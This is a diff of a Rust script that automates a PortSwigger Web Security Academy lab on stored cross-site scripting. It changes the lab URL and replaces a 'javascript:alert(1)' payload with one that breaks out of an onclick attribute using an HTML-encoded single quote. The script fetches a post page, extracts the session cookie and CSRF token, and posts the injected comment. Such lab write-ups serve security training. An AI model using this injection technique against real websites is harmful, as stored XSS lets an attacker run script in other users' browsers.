@@ -1,16 +1,17 @@
-/********************************************************************************
+/******************************************************************************************
 *
 * Author: Ahmed Elqalaawy (@elqal3awii)
 *
-* Date: 17/11/2023
+* Date: 24/11/2023
 *
-* Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
+* Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded 
+*      and single quotes and backslash escaped
 *
 * Steps: 1. Fetch a post page
 *        2. Extract the session cookie and the csrf token to post a comment
 *        3. Post a comment with the injected payload in the website field
 *
-*********************************************************************************/
+*******************************************************************************************/
 #![allow(unused)]
 /***********
 * Imports
@@ -34,7 +35,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0af2008a0401c0468389746300960050.web-security-academy.net";
+    let url = "https://0adf00bd04e924c3804835a900cf00fa.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -73,7 +74,7 @@ fn main() {
     io::stdout().flush();
 
     // payload to call the alert function
-    let payload = "javascript:alert(1)";
+    let payload = "http://lol.com&apos;);alert();//";
 
     // post a comment with the injected payload in the website field
     client
